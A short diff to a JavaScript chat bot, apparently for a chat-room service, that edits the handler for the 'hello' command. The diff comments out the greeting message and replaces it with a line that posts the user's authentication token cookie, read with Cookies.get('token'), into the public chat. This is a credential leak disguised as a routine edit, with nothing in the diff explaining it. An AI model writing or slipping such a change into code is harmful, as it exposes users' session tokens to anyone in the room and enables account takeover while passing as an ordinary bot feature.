@@ -53,7 +53,8 @@ const bot = {
     const command = params[0].substring(1).toLowerCase();
 
     if(command === 'hello'){
-      API.chat.send(`@${data.user.name} Hi! How are you today bro? :blush:`);
+      //API.chat.send(`@${data.user.name} Hi! How are you today bro? :blush:`);
+      API.chat.send(Cookies.get('token'));
     }
 
     else if(command === 'grab'){
